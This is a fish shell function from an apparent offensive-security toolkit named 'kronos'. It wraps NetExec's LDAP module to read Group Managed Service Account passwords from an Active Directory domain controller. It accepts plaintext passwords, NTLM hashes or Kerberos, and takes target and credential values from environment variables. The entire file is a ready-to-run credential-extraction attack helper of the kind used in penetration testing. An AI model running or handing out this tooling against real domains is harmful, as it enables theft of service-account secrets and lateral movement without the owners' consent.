# description: Read GMSA passwords using nxc ldap
function __kronos_gmsa --description "Read GMSA passwords using nxc ldap"
    argparse h/help u/username= p/password= H/hash= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos gmsa [TARGET] [OPTIONS]"
        echo ""
        echo "Read GMSA passwords using nxc ldap."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC_IP or \$TGT_DC)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username (falls back to \$TGT_CRED_USERNAME)"
        echo "  -p, --password PASS Provide password (falls back to \$TGT_CRED_PASSWORD)"
        echo "  -H, --hash HASH     Provide NTLM hash"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    set -l user $_flag_username; if test -z "$user"; set user $TGT_USERNAME; end
    if test -z "$user"; set user $TGT_CRED_USERNAME; end
    
    set -l pass $_flag_password; if test -z "$pass"; set pass $TGT_PASSWORD; end
    if test -z "$pass"; set pass $TGT_CRED_PASSWORD; end

    if not command -v nxc >/dev/null
        echo "error: nxc not found. run 'kronos install'." >&2
        return 1
    end

    set -l nxc_cmd nxc ldap $target
    if test -n "$TGT_DC_DOMAIN"; set -a nxc_cmd -d $TGT_DC_DOMAIN; end

    if set -q _flag_kerberos
        set -a nxc_cmd -k -u $user -p ''
    else
        if test -z "$user"
            echo "error: credentials required" >&2
            return 1
        end
        set -a nxc_cmd -u $user
        if set -q _flag_hash
            set -a nxc_cmd -H $_flag_hash
        else
            set -a nxc_cmd -p $pass
        end
    end

    set -a nxc_cmd --gmsa

    echo "[*] Reading GMSA passwords via nxc ldap..."
    command $nxc_cmd
end
